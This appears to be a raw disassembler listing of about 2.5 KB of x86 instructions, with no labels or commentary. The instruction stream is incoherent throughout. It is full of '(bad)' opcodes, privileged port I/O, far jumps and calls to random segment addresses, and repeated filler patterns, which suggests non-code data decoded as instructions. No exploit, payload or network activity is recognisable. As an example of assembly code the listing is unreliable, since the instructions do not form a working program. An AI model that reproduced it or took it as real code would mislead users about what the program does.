  4221ec:	imul   ebp,DWORD PTR [eiz*2+0x50d0dcfc],0x2d
  4221f4:	dec    esi
  4221f5:	cmp    dh,BYTE PTR [ebx+0x7b]
  4221f8:	mov    ah,0x43
  4221fa:	or     BYTE PTR [ecx],bh
  4221fc:	cmp    BYTE PTR [ebp+edx*8+0x66],cl
  422200:	pop    ds
  422201:	pop    ebp
  422202:	mov    al,0xb6
  422204:	sbb    eax,DWORD PTR [eax+0x5261198a]
  42220a:	shl    BYTE PTR [edx-0x73],cl
  42220d:	sbb    al,0x1
  42220f:	or     ecx,DWORD PTR [ecx-0x73]
  422212:	add    ah,BYTE PTR [ecx]
  422214:	ret    
  422215:	add    BYTE PTR [ebx+0x1254a454],0xb6
  42221c:	fist   WORD PTR [eax]
  42221e:	retf   0x964a
  422221:	pop    esp
  422222:	push   ss
  422223:	ins    DWORD PTR es:[edi],dx
  422224:	push   edx
  422225:	cli    
  422226:	dec    ebp
  422227:	(bad)  
  422229:	test   BYTE PTR [ecx+0x17],dh
  42222c:	add    bh,BYTE PTR [esi]
  42222e:	jecxz  0x4221e4
  422230:	push   ebx
  422231:	cmp    BYTE PTR [ebx+0x6ea5],bl
	...
  422293:	add    BYTE PTR [eax],al
  422295:	add    BYTE PTR [edi-0x10085213],cl
  42229b:	neg    edi
  42229d:	std    
  42229e:	fsubr  DWORD PTR [edi-0x12]
  4222a1:	adc    eax,DWORD PTR [edi+0x15727d32]
  4222a7:	imul   eax,DWORD PTR [ecx],0x0
  4222aa:	pop    es
  4222ab:	add    DWORD PTR [eax],eax
  4222ad:	add    BYTE PTR [edi],dh
  4222af:	fistp  QWORD PTR [edi]
  4222b1:	enter  0xcbe3,0xb3
  4222b5:	out    dx,al
  4222b6:	enter  0x6ff3,0xee
  4222ba:	ds push edi
  4222bc:	xchg   ebp,ebx
  4222be:	push   0xd293bbc9
  4222c3:	lahf   
  4222c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4222c5:	lahf   
  4222c6:	aaa    
  4222c7:	cmc    
  4222c8:	(bad)  
  4222c9:	sbb    ch,dh
  4222cb:	cdq    
  4222cc:	in     ax,0xc1
  4222cf:	mov    esi,0xb798b88e
  4222d4:	sbb    DWORD PTR [esi+0x6b27ee7a],eax
  4222da:	jp     0x4222d4
  4222dc:	push   0xdc482ef0
  4222e1:	xchg   DWORD PTR [eax],edi
  4222e3:	pop    ebp
  4222e4:	mov    edi,0xfeceee5
  4222e9:	add    eax,0x1a41b5c
  4222ee:	test   BYTE PTR [ebp+0x4b],0xef
  4222f2:	fadd   QWORD PTR [ecx+0xa72270]
  4222f8:	aad    0xf3
  4222fa:	ins    DWORD PTR es:[edi],dx
  4222fb:	and    eax,0x7c5debc6
  422300:	pop    ecx
  422301:	sub    BYTE PTR [eax],0x7b
  422304:	das    
  422305:	fisub  DWORD PTR [edi-0x3]
  422308:	in     al,dx
  422309:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42230a:	pushf  
  42230b:	add    esp,esi
  42230d:	fdivr  DWORD PTR [ebx]
  42230f:	jecxz  0x422295
  422311:	lods   eax,DWORD PTR ds:[esi]
  422312:	add    al,0xcb
  422314:	test   al,0x56
  422316:	add    al,0x15
  422318:	(bad)  
  422319:	or     DWORD PTR [edi-0x2c1e423d],ebp
  42231f:	(bad)  
  422320:	ror    BYTE PTR [ebp+0x7afaee9b],cl
  422326:	cld    
  422327:	stc    
  422328:	mov    ch,BYTE PTR [eax+0x1f]
  42232b:	or     ch,bl
  42232d:	push   esp
  42232e:	retf   0xc8c5
  422331:	inc    esi
  422332:	sbb    al,0x16
  422334:	cmc    
  422335:	jo     0x4223b4
  422337:	gs sub al,0x87
  42233a:	aaa    
  42233b:	dec    ebp
  42233c:	mov    DWORD PTR [ebx-0x1b809af8],ebp
  422342:	and    BYTE PTR [edx],dl
  422344:	pop    es
  422345:	jge    0x422361
  422347:	push   ecx
  422348:	mov    al,ds:0x24273aa5
  42234d:	lahf   
  42234e:	push   edx
  42234f:	adc    DWORD PTR [ecx],esp
  422351:	xchg   esi,eax
  422352:	mov    ebp,0x8fb5fbfe
  422357:	mov    cl,0x94
  422359:	pop    ds
  42235a:	pushf  
  42235b:	or     esp,ebp
  42235d:	pop    ebp
  42235e:	pop    esi
  42235f:	pand   mm2,QWORD PTR [ecx]
  422362:	push   es
  422363:	repnz cmp bl,BYTE PTR [ecx+0x28]
  422367:	xor    eax,0xa5bc8495
  42236c:	fldenv ds:0x628e6e93
  422372:	and    al,0x17
  422374:	xchg   edi,eax
  422375:	jmp    0x42233d
  422377:	dec    edi
  422378:	out    dx,al
  422379:	cmp    ecx,ebx
  42237b:	leave  
  42237c:	aad    0x7b
  42237e:	rcl    DWORD PTR [edx-0x77],cl
  422381:	mov    edx,0xfa1160ff
  422386:	push   ebx
  422387:	push   es
  422388:	aad    0x2d
  42238a:	mov    cl,0x19
  42238c:	sar    DWORD PTR [esi+esi*2-0x5c8cb208],1
  422393:	mov    esp,0xa5f76305
  422398:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422399:	jae    0x42234c
  42239b:	ds mov ebx,0xa9aeff38
  4223a1:	add    BYTE PTR [edi-0x6f],0xa9
  4223a5:	test   ebp,esi
  4223a7:	mov    al,ds:0x51264288
  4223ac:	jb     0x422403
  4223ae:	clc    
  4223af:	jl     0x42239e
  4223b1:	sahf   
  4223b2:	xor    ebp,DWORD PTR [edi+0xbb]
	...
  422414:	add    BYTE PTR [eax],al
  422416:	push   edx
  422417:	sub    BYTE PTR [esi],0x69
  42241a:	(bad)  
  42241b:	in     eax,dx
  42241c:	push   edi
  42241d:	mov    ebx,0x65b61588
  422422:	enter  0x2563,0xbf
  422426:	sbb    al,0x6c
  422428:	add    DWORD PTR [eax],eax
  42242a:	pop    es
  42242b:	add    DWORD PTR [eax],eax
  42242d:	add    BYTE PTR [ebp+0xa],bl
  422430:	es repnz fwait
  422433:	js     0x422489
  422435:	fcomp  DWORD PTR [ebp+0x4d]
  422438:	outs   dx,BYTE PTR ds:[esi]
  422439:	xor    BYTE PTR [ecx+0x31],dh
  42243c:	rcr    BYTE PTR [eax+0x56],cl
  42243f:	and    esp,DWORD PTR [eax-0x41]
  422442:	push   ss
  422443:	push   ss
  422444:	mov    ah,0x39
  422446:	jge    0x4223f4
  422448:	cmp    DWORD PTR [esi],eax
  42244a:	mov    al,0xb8
  42244c:	dec    eax
  42244d:	fld    QWORD PTR [esi-0x2a]
  422450:	hlt    
  422451:	pop    ds
  422452:	inc    edi
  422453:	mov    ds:0xbf6d0a7e,eax
  422458:	mov    eax,ds:0xeb9a4def
  42245d:	jno    0x422440
  42245f:	push   ebp
  422460:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422461:	loop   0x42249b
  422463:	mov    dh,0xee
  422465:	(bad)  
  422466:	jp     0x422499
  422468:	in     eax,0xb3
  42246a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42246b:	mov    es,WORD PTR [edi]
  42246d:	jl     0x422426
  42246f:	jmp    0xcebbefb9
  422474:	mov    edx,0xcc79f36b
  422479:	sub    ebx,0x53
  42247c:	and    al,0xc7
  42247e:	sbb    DWORD PTR ss:[eax-0x3a],0x2bd79a85
  422486:	add    eax,0x174b0589
  42248b:	scas   eax,DWORD PTR es:[edi]
  42248c:	jle    0x4224cf
  42248e:	jg     0x42243b
  422490:	jo     0x42249e
  422492:	push   ss
  422493:	push   ebp
  422494:	jl     0x4224e0
  422496:	inc    edx
  422497:	(bad)  [edx]
  422499:	loope  0x42242d
  42249b:	(bad)  
  42249c:	sub    DWORD PTR [eax-0x498cd7dd],0x24
  4224a3:	daa    
  4224a4:	in     eax,0xad
  4224a6:	pusha  
  4224a7:	retf   0x3984
  4224aa:	cmp    bh,BYTE PTR [eax-0x10349e84]
  4224b0:	mov    ds:0x1c38671,al
  4224b5:	js     0x4224e0
  4224b7:	ds pop eax
  4224b9:	(bad)  
  4224ba:	pop    edi
  4224bb:	and    eax,0x52d89f97
  4224c0:	pop    ecx
  4224c1:	cmp    eax,0xa288078c
  4224c6:	cmp    al,0x1d
  4224c8:	dec    esp
  4224c9:	push   0xa
  4224cb:	outs   dx,DWORD PTR ds:[esi]
  4224cc:	sbb    DWORD PTR [edi+0x6e],edi
  4224cf:	mov    dh,0xf2
  4224d1:	mov    al,ds:0x82bb34db
  4224d6:	and    ah,ch
  4224d8:	sub    ecx,DWORD PTR [ebp+0x2d2a2789]
  4224de:	dec    edi
  4224df:	(bad)  
  4224e0:	cmp    eax,0x724703b9
  4224e5:	ficomp WORD PTR [eax+0x4d]
  4224e8:	xlat   BYTE PTR ds:[ebx]
  4224e9:	xor    BYTE PTR [ecx+0x3b],ah
  4224ec:	int3   
  4224ed:	shl    BYTE PTR [ebx+0x4e],0x72
  4224f1:	push   es
  4224f2:	mov    ?,WORD PTR [eax-0x787b8f]
  4224f8:	into   
  4224f9:	int3   
  4224fa:	dec    ebp
  4224fb:	or     al,0x6
  4224fd:	xchg   ecx,eax
  4224fe:	jno    0x42251f
  422500:	cdq    
  422501:	lods   al,BYTE PTR ds:[esi]
  422502:	mov    ch,0xb2
  422504:	xor    al,0x76
  422506:	and    BYTE PTR [edi],ch
  422508:	jmp    0x4224b6
  42250a:	popa   
  42250b:	xor    al,0xee
  42250d:	hlt    
  42250e:	mov    bl,0xa7
  422510:	xor    al,0x7
  422512:	nop
  422513:	jbe    0x4224f1
  422515:	jmp    0x69c217f5
  42251a:	sub    bh,BYTE PTR [ebx+eiz*4-0x2f0b44f3]
  422521:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422522:	fwait
  422523:	pushf  
  422524:	test   DWORD PTR [edx],edi
  422526:	loope  0x4224b5
  422528:	cmp    BYTE PTR ds:0xf2b121d3,dh
  42252e:	call   0x8d5e23f4
  422533:	retf   
  422534:	sub    eax,DWORD PTR [eax]
	...
  422596:	call   0xfa77:0xbf778fae
  42259d:	out    dx,eax
  42259e:	and    ebx,DWORD PTR [esi]
  4225a0:	outs   dx,DWORD PTR ds:[esi]
  4225a1:	fdiv   DWORD PTR [ecx]
  4225a3:	mov    esp,0x6d236e36
  4225a8:	add    DWORD PTR [eax],eax
  4225aa:	pop    es
  4225ab:	add    DWORD PTR [eax],eax
  4225ad:	add    BYTE PTR [edx],dl
  4225af:	mov    eax,0xa3a199fa
  4225b4:	sub    eax,0x43a3c561
  4225b9:	fcom   DWORD PTR [ebp+0x1a7553da]
  4225bf:	dec    eax
  4225c0:	pop    ebp
  4225c1:	jecxz  0x422603
  4225c3:	sub    ebp,DWORD PTR [eax+0x5d]
  4225c6:	jbe    0x4225dd
  4225c8:	jae    0x422599
  4225ca:	add    BYTE PTR [ebx+0x663b0830],dh
  4225d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225d1:	lea    edi,[ecx-0x6a1f633e]
  4225d7:	ror    DWORD PTR [edx+0x2],cl
  4225da:	iret   
  4225db:	or     BYTE PTR [edx+0x6114c35f],0x2b
  4225e2:	cmp    DWORD PTR [edi],esi
  4225e4:	push   0xffffff99
  4225e6:	or     ch,ch
  4225e8:	push   es
  4225e9:	cmp    al,cl
  4225eb:	loop   0x422647
  4225ed:	and    eax,0xf701d1e4
  4225f2:	pop    ds
  4225f3:	mov    ah,0x90
  4225f5:	or     DWORD PTR [ebp-0x40],edi
  4225f8:	int3   
  4225f9:	imul   esp,DWORD PTR [ecx*1-0x6e9799ba],0xa5875fc8
  422604:	adc    cl,BYTE PTR [ecx+0xca919e8]
  42260a:	xchg   sp,ax
  42260c:	sbb    BYTE PTR [ecx],ch
  42260e:	test   ch,bh
  422610:	ror    BYTE PTR [edx-0x16],cl
  422613:	nop
  422614:	adc    al,0xf7
  422616:	leave  
  422617:	jp     0x42265c
  422619:	loop   0x4225fa
  42261b:	aam    0xd3
  42261d:	test   BYTE PTR [ebx],cl
  42261f:	ffree  st(3)
  422622:	push   ebx
  422623:	lods   eax,DWORD PTR ds:[esi]
  422624:	bound  edi,QWORD PTR [ecx+0x25b59a45]
  42262a:	js     0x4225ec
  42262c:	je     0x422654
  42262e:	pusha  
  42262f:	std    
  422630:	inc    edi
  422631:	call   0xef0944c5
  422636:	jge    0x42266e
  422638:	adc    edi,eax
  42263a:	jne    0x4226b9
  42263c:	lods   al,BYTE PTR ds:[esi]
  42263d:	and    DWORD PTR [edx+edx*4],0x75
  422641:	into   
  422642:	sub    ecx,DWORD PTR [eax+0x5b]
  422645:	push   edi
  422646:	pop    ebp
  422647:	mov    WORD PTR [esi-0x50],es
  42264a:	(bad)  
  42264b:	dec    edi
  42264c:	imul   eax,DWORD PTR [ebp-0x564e9bba],0x54fdca52
  422656:	scas   eax,DWORD PTR es:[edi]
  422657:	cmp    cl,dh
  422659:	repz xlat BYTE PTR ds:[ebx]
  42265b:	iret   
  42265c:	mov    ah,0xa4
  42265e:	dec    ebp
  42265f:	jb     0x4225fe
  422661:	push   0x98d273c8
  422666:	mov    edx,0xda5b987
  42266b:	jne    0x422665
  42266d:	inc    eax
  42266e:	and    bl,BYTE PTR ds:0xc98cd558
  422674:	add    al,0xb6
  422676:	outs   dx,BYTE PTR ds:[esi]
  422677:	pop    ds
  422678:	adc    BYTE PTR [ebx-0x97f2032],dl
  42267e:	pop    esi
  42267f:	mov    dl,0x67
  422681:	mov    esp,DWORD PTR [edi-0x1deaa84f]
  422687:	jno    0x42268c
  422689:	and    ch,BYTE PTR [ecx+edi*8+0x36]
  42268d:	mov    ds:0x4560f02b,al
  422692:	inc    esp
  422693:	push   ds
  422694:	sbb    BYTE PTR [edi+0x6c],0x3c
  422698:	fadd   DWORD PTR [ebx-0x7d9b19d]
  42269e:	mov    dh,0xf0
  4226a0:	adc    ah,ah
  4226a2:	call   0x446c:0xf6e3edb7
  4226a9:	xchg   edi,eax
  4226aa:	ss scas al,BYTE PTR es:[edi]
  4226ac:	aas    
  4226ad:	push   es
  4226ae:	scas   eax,DWORD PTR es:[edi]
  4226af:	sub    eax,0xc580ea7d
  4226b4:	loop   0x4226b6
	...
  422716:	daa    
  422717:	sub    eax,0x7d7f2d7d
  42271c:	ja     0x42274d
  42271e:	aad    0x21
  422720:	add    al,0x2f
  422722:	cmp    ebx,0x6e2ac10f
  422728:	add    DWORD PTR [eax],eax
  42272a:	pop    es
  42272b:	add    DWORD PTR [eax],eax
  42272d:	add    BYTE PTR [ecx+0x7f],ch
  422730:	mov    ds:0x47d1b28,al
  422735:	adc    bh,BYTE PTR ds:0x2cdd4ed4
  42273b:	or     eax,0xd2aa8286
  422740:	inc    edi
  422741:	mov    esp,DWORD PTR [ebx+0x6bdbf6c]
  422747:	pop    edx
  422748:	pop    ecx
  422749:	dec    ebp
  42274a:	stos   DWORD PTR es:[di],eax
  42274c:	ja     0x4227ad
  42274e:	pusha  
  42274f:	inc    esp
  422750:	mov    ds:0x3b196b92,eax
  422755:	pusha  
  422756:	push   ebx
  422757:	daa    
  422758:	sbb    esi,DWORD PTR ds:0x8a6453e
  42275e:	or     al,0xe2
  422760:	int3   
  422761:	loop   0x422712
  422763:	dec    esp
  422764:	dec    ebx
  422765:	jle    0x4227c2
  422767:	sahf   
  422768:	ins    DWORD PTR es:[edi],dx
  422769:	cwde   
  42276a:	mov    ebx,0xaf9ddb7a
  42276f:	sbb    ebp,DWORD PTR [ebp+0x269fedbc]
  422775:	sub    BYTE PTR [ecx-0x68],cl
  422778:	or     eax,0x61436935
  42277d:	ret    
  42277e:	(bad)  
  42277f:	enter  0x45ef,0x38
  422783:	out    dx,eax
  422784:	bswap  ebp
  422786:	xchg   ebx,eax
  422787:	push   es
  422788:	aas    
  422789:	pushw  ss
  42278b:	mov    al,0x2
  42278d:	mov    esi,0xc262dc23
  422792:	mov    edi,0x795689eb
  422797:	pop    edi
  422798:	xor    al,0x84
  42279a:	mov    ch,0x2b
  42279c:	clc    
  42279d:	fnstcw WORD PTR [eax-0x381bec3d]
  4227a3:	sbb    DWORD PTR [ecx-0x1e],esi
  4227a6:	mov    ebx,0x35f3cfa4
  4227ab:	jmp    0xb59b:0x503d3c13
  4227b2:	or     BYTE PTR [ebx],dl
  4227b4:	jmp    0x42273a
  4227b6:	pushf  
  4227b7:	inc    ecx
  4227b8:	cmp    BYTE PTR [ebp+0x2556e555],bl
  4227be:	xor    DWORD PTR [eax+eiz*8+0x4e],0x2da5dd61
  4227c6:	div    ch
  4227c8:	call   0xe43c:0xe8fdb4d
  4227cf:	adc    eax,0x3f462f5d
  4227d4:	add    eax,0x2580e43e
  4227d9:	mov    al,0x1f
  4227db:	pop    edx
  4227dc:	sbb    DWORD PTR [edi-0x30],edi
  4227df:	mov    al,0xf3
  4227e1:	xor    eax,0x96f96992
  4227e6:	jge    0x4227ec
  4227e8:	xor    BYTE PTR [edx],dh
  4227ea:	xor    DWORD PTR ds:0x9b33884d,0x2f
  4227f1:	cmp    al,0xe4
  4227f3:	bound  edi,QWORD PTR [ebp-0xab28f11]
  4227f9:	jns    0x422820
  4227fb:	mov    eax,0x5fb68eb0
  422800:	push   cs
  422801:	div    bl
  422803:	retf   0xa1d0
  422806:	pusha  
  422807:	push   edi
  422808:	mov    ecx,0x662961c2
  42280d:	jecxz  0x4227d2
  42280f:	pop    ss
  422810:	pop    ebx
  422811:	je     0x42287c
  422813:	mov    ds:0x47eb2874,eax
  422818:	dec    edx
  422819:	fdiv   QWORD PTR [edi]
  42281b:	mov    eax,0x85b8ccdd
  422820:	in     eax,dx
  422821:	xor    esp,DWORD PTR [eax-0x31795060]
  422827:	shl    BYTE PTR [ecx+esi*1],cl
  42282a:	imul   ecx,ebp,0x2d
  42282d:	lock enter 0x16d3,0xf0
  422832:	ins    BYTE PTR es:[edi],dx
  422833:	lods   al,BYTE PTR ds:[esi]
  422834:	inc    esp
	...
  422895:	add    ch,cl
  422897:	cmp    DWORD PTR [eax-0x10680369],edi
  42289d:	jnp    0x42284b
  42289f:	inc    ebx
  4228a0:	cmp    bl,BYTE PTR [esp+edx*8]
  4228a3:	outs   dx,DWORD PTR ds:[esi]
  4228a4:	mov    dl,0x70
  4228a6:	xor    DWORD PTR [edi+0x1],ebp
  4228a9:	add    BYTE PTR [edi],al
  4228ab:	add    DWORD PTR [eax],eax
  4228ad:	add    BYTE PTR [edx+0x60],cl
  4228b0:	mov    ebp,0x504b3334
  4228b5:	and    BYTE PTR [ebx+edx*4],dh
  4228b8:	mov    gs,WORD PTR [esp+edx*2]
  4228bb:	outs   dx,DWORD PTR ds:[esi]
  4228bc:	call   0x20bd:0x1f54944
  4228c3:	xlat   BYTE PTR ds:[ebx]
  4228c4:	xchg   esp,eax
  4228c5:	jge    0x4228a9
  4228c7:	mov    dl,0xba
  4228c9:	jecxz  0x422874
  4228cb:	add    BYTE PTR [eax-0x46d81500],0xe4
  4228d2:	ins    DWORD PTR es:[edi],dx
  4228d3:	inc    edx
  4228d4:	fmul   DWORD PTR ds:0xf1b5e643
  4228da:	fdivr  QWORD PTR [ebx-0x73]
  4228dd:	inc    edi
  4228de:	mov    esp,0xd0a1932c
  4228e3:	scas   al,BYTE PTR es:[edi]
  4228e4:	push   ss
  4228e5:	jns    0x4228dc
  4228e7:	(bad)  [esi-0x3f843ce1]
  4228ed:	xor    edx,0xffffff8c
  4228f0:	das    
  4228f1:	sub    cl,BYTE PTR [esi-0x10f3f0ce]
  4228f7:	inc    eax
  4228f8:	mov    ecx,0xf15a5062
  4228fd:	xchg   edx,eax
  4228fe:	push   edi
  4228ff:	dec    ebx
  422900:	bound  edi,QWORD PTR [esi+0x47137cd3]
  422906:	xchg   esp,eax
  422907:	add    eax,0x9e27fa0d
  42290c:	fistp  QWORD PTR [edi-0x6b21022c]
  422912:	or     bl,BYTE PTR [esp+ecx*2]
  422915:	jl     0x422985
  422917:	in     al,0xa0
  422919:	dec    ecx
  42291a:	jge    0x4228e9
  42291c:	fbld   TBYTE PTR [edx]
  42291e:	adc    BYTE PTR [ecx+ecx*2],bl
  422921:	inc    ebp
  422922:	inc    ebp
  422923:	xor    al,0x65
  422925:	fistp  DWORD PTR [eax]
  422927:	mov    dh,0x6c
  422929:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42292a:	jmp    0xefae5f8c
  42292f:	stc    
  422930:	jns    0x42290e
  422932:	shl    DWORD PTR [edx+ebx*8-0x7ae9f09a],cl
  422939:	add    eax,0xeaa070d3
  42293e:	xchg   cl,ch
  422940:	fimul  WORD PTR [esi]
  422942:	in     al,0xb9
  422944:	jecxz  0x422970
  422946:	xchg   ebx,eax
  422947:	mov    ds:0x8c88f3a,eax
  42294c:	sar    DWORD PTR [ebx-0x423ed92],1
  422952:	shr    ch,1
  422954:	mov    ch,BYTE PTR [edi]
  422956:	call   0x6b97eb50
  42295b:	js     0x422938
  42295d:	xor    eax,0xf1cb36fb
  422962:	rcr    edi,0x71
  422965:	ins    DWORD PTR es:[edi],dx
  422966:	push   edx
  422967:	mov    ah,0x3c
  422969:	fidiv  WORD PTR [edx-0x5d]
  42296c:	pop    ecx
  42296d:	sub    edx,DWORD PTR [ecx]
  42296f:	loope  0x422915
  422971:	inc    edi
  422972:	or     DWORD PTR [ebp+0x5cf49451],edi
  422978:	ss mov ecx,0x20239231
  42297e:	jg     0x4229f5
  422980:	xchg   esp,esi
  422982:	outs   dx,DWORD PTR ds:[esi]
  422983:	adc    cl,BYTE PTR [ebx]
  422985:	fwait
  422986:	inc    ecx
  422987:	stc    
  422988:	sub    bh,BYTE PTR [edx+0x7211a24e]
  42298e:	mov    ah,0x4f
  422990:	inc    eax
  422991:	fdiv   DWORD PTR [ecx+0x28]
  422994:	adc    al,0xab
  422996:	js     0x422a13
  422998:	cld    
  422999:	adc    al,0xb8
  42299b:	cli    
  42299c:	mov    al,0x87
  42299e:	dec    edx
  42299f:	push   es
  4229a0:	jle    0x42295b
  4229a2:	test   DWORD PTR [ebx-0x487aabd1],edi
  4229a8:	fnop   
  4229aa:	pop    ds
  4229ab:	cmc    
  4229ac:	sbb    al,BYTE PTR [eax-0x72]
  4229af:	int3   
  4229b0:	cli    
  4229b1:	sub    esp,esp
  4229b3:	ret    
  4229b4:	mov    cl,0x0
	...
  422a16:	xchg   esi,eax
  422a17:	push   0x18
  422a19:	mov    ah,bh
  422a1b:	cli    
  422a1c:	xchg   esi,eax
  422a1d:	jle    0x422a63
  422a1f:	rol    ecx,1
  422a21:	call   0xde40ecb5
  422a26:	cmp    BYTE PTR [eax+0x1],dh
  422a29:	add    BYTE PTR [edi],al
  422a2b:	add    DWORD PTR [eax],eax
  422a2d:	add    dl,al
  422a2f:	cmp    DWORD PTR [ebp+0xd],ebp
  422a32:	mov    ch,BYTE PTR [esi-0x303f4ae5]
  422a38:	into   
  422a39:	and    BYTE PTR [esi+0x7ed858c8],al
  422a3f:	std    
  422a40:	sbb    eax,0xf3b60f1d
  422a45:	sbb    ebp,DWORD PTR [ebp+0x3c07ba58]
  422a4b:	mov    ah,0x0
  422a4d:	xchg   esi,ecx
  422a4f:	jp     0x422a8f
  422a51:	icebp  
  422a52:	xchg   edx,eax
  422a53:	pop    ecx
  422a54:	scas   al,BYTE PTR es:[edi]
  422a55:	in     al,0xf0
  422a57:	sbb    al,0x44
  422a59:	cs inc edx
  422a5b:	aaa    
  422a5c:	pop    ebx
  422a5d:	test   eax,0x321e6155
  422a62:	or     BYTE PTR [ebx+0x2838d6f],al
  422a68:	ret    
  422a69:	sbb    al,0x18
  422a6b:	mov    ds:0xa2ceee46,al
  422a70:	ins    DWORD PTR es:[edi],dx
  422a71:	popf   
  422a72:	into   
  422a73:	mov    esi,0x544eec43
  422a78:	int    0x23
  422a7a:	xchg   esp,eax
  422a7b:	jmp    0xa9f7:0x588cf42e
  422a82:	aaa    
  422a83:	mov    al,ch
  422a85:	mov    WORD PTR [esi+0x13],es
  422a88:	jp     0x422a62
  422a8a:	cmp    DWORD PTR [esi+0x21c226f1],edx
  422a90:	mov    eax,ds:0x98920758
  422a95:	ds stos DWORD PTR es:[edi],eax
  422a97:	mov    ch,0x12
  422a99:	shl    ebx,cl
  422a9b:	pop    eax
  422a9c:	pop    ecx
  422a9d:	jp     0x422b02
  422a9f:	push   cs
  422aa0:	xchg   esp,eax
  422aa1:	jmp    0x2d40:0x7c745f13
  422aa8:	jmp    0x7256:0x328e98c7
  422aaf:	int3   
  422ab0:	loop   0x422b2f
  422ab2:	pop    ebp
  422ab3:	stos   BYTE PTR es:[edi],al
  422ab4:	ss xor dl,cl
  422ab7:	and    eax,0x9de9cad3
  422abc:	xchg   edx,eax
  422abd:	shl    DWORD PTR [eax-0x13],0xa8
  422ac1:	ret    0x5017
  422ac4:	test   ecx,0x6229e17f
  422aca:	(bad)  
  422acc:	cmovp  edi,DWORD PTR [edi-0x484f9ed0]
  422ad3:	and    ch,dl
  422ad5:	or     al,0x10
  422ad7:	pop    ebx
  422ad8:	repz (bad) 
  422ada:	loope  0x422ab5
  422adc:	mov    bh,0x78
  422ade:	mov    al,ds:0x5ccee6f8
  422ae3:	cmp    eax,edx
  422ae5:	jae    0x422af2
  422ae7:	popa   
  422ae8:	push   es
  422ae9:	or     ecx,ebx
  422aeb:	mov    ebp,0x83662c1a
  422af0:	ficom  WORD PTR [ebx+ebx*4-0x5d401fc9]
  422af7:	or     bl,BYTE PTR gs:[edi+0x29964c40]
  422afe:	xor    al,0x45
  422b00:	paddsw mm5,QWORD PTR [ecx-0x42500bd2]
  422b07:	shr    BYTE PTR [eax+0x39],0x47
  422b0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b0c:	lahf   
  422b0d:	mov    esi,0x243c5deb
  422b12:	dec    edx
  422b13:	mov    eax,ds:0x2351ef00
  422b18:	and    BYTE PTR [bx+si+0x64a5],ah
  422b1d:	ins    BYTE PTR es:[edi],dx
  422b1e:	lea    edi,[ebx]
  422b20:	mov    dh,0xf8
  422b22:	xchg   esi,eax
  422b23:	push   ebx
  422b24:	jmp    0x422ac3
  422b26:	adc    DWORD PTR [ebx-0x6051b639],edi
  422b2c:	fadd   QWORD PTR [edi+0x59]
  422b2f:	jno    0x422b1a
  422b31:	mov    edi,0xc59295
	...
  422b96:	inc    esp
  422b97:	aaa    
  422b98:	dec    edx
  422b99:	fwait
  422b9a:	jnp    0x422b9b
  422b9c:	aad    0xff
  422b9e:	push   cs
  422b9f:	adc    ebx,DWORD PTR [ecx+0x1a3b6b1c]
  422ba5:	stos   BYTE PTR es:[edi],al
  422ba6:	aas    
  422ba7:	jno    0x422baa
  422ba9:	add    BYTE PTR [edi],al
  422bab:	add    DWORD PTR [eax],eax
  422bad:	add    dh,bh
  422baf:	push   eax
  422bb0:	push   ss
  422bb1:	push   0x50
  422bb3:	and    eax,0x12a3accc
  422bb8:	jmp    0x24ee:0x41d22230
  422bbf:	fsubr  QWORD PTR [eax+0x39]
  422bc2:	inc    esp
  422bc3:	scas   al,BYTE PTR es:[edi]
  422bc4:	cs jecxz 0x422bda
  422bc7:	jmp    0xec4e361e
  422bcc:	add    BYTE PTR [edx+0x7358fcea],ch
  422bd2:	push   ebp
  422bd3:	and    cl,dh
  422bd5:	dec    edi
  422bd6:	or     edi,edi
  422bd8:	fmul   QWORD PTR ds:0x3e10ee20
  422bde:	jp     0x422bbe
  422be0:	sbb    BYTE PTR [ebp+0x27],bh
  422be3:	inc    ebp
  422be4:	xchg   esp,eax
  422be5:	mov    esi,0x5ba30d23
  422bea:	shl    DWORD PTR [edi-0x6],0xe0
  422bee:	stos   DWORD PTR es:[edi],eax
  422bef:	xor    DWORD PTR [edx],eax
  422bf1:	(bad)  
  422bf2:	pop    edi
  422bf3:	dec    dl
  422bf5:	xchg   ebx,eax
  422bf6:	jne    0x422c5f
  422bf8:	jns    0x422c66
  422bfa:	sbb    eax,0x8d3ae83e
  422bff:	and    BYTE PTR [esi+0x3c],al
  422c02:	inc    ebx
  422c03:	sub    BYTE PTR [eax-0x57],ch
  422c06:	jge    0x422c33
  422c08:	lods   al,BYTE PTR ds:[esi]
  422c09:	out    0xf1,eax
  422c0b:	add    BYTE PTR [esi+0x74],bh
  422c0e:	bnd jne 0x422c7b
  422c11:	inc    edx
  422c12:	push   es
  422c13:	mov    dh,0x13
  422c15:	andnps xmm5,xmm6
  422c18:	mov    ebp,0xdcb6f82c
  422c1d:	add    BYTE PTR [edx-0x3],dh
  422c20:	retf   0xaa4b
  422c23:	add    DWORD PTR [ecx+0x69fba7de],0x49
  422c2a:	pop    edx
  422c2b:	jns    0x422bb2
  422c2d:	push   ds
  422c2e:	test   dh,cl
  422c30:	jns    0x422bf7
  422c32:	fldenv [eax-0x51]
  422c35:	pop    edx
  422c36:	ret    0x9b1a
  422c39:	jne    0x422c5a
  422c3b:	popa   
  422c3c:	add    eax,0x57fa6c52
  422c41:	pushw  ss
  422c43:	sbb    BYTE PTR [edx+0x7fb70582],al
  422c49:	shl    BYTE PTR [ebx+esi*2-0x201aec76],0x16
  422c51:	(bad)  
  422c52:	in     al,dx
  422c53:	cmp    DWORD PTR [eax+esi*2-0x30],0x3a02b8e8
  422c5b:	test   bl,cl
  422c5d:	push   ss
  422c5e:	xor    DWORD PTR [esi+0x1a3bfa63],edx
  422c64:	ss popf 
  422c66:	imul   eax,DWORD PTR [ecx+0x23aef3e4],0xffffffb7
  422c6d:	shl    BYTE PTR ds:0x198f980b,0x6e
  422c74:	jnp    0x422c65
  422c76:	push   esi
  422c77:	adc    edx,DWORD PTR [eax-0x55]
  422c7a:	mul    BYTE PTR [eax]
  422c7c:	mov    ebx,0xadb9a698
  422c81:	push   ebx
  422c82:	sti    
  422c83:	sub    al,0x74
  422c85:	pushf  
  422c86:	fs pop esi
  422c88:	in     eax,0x88
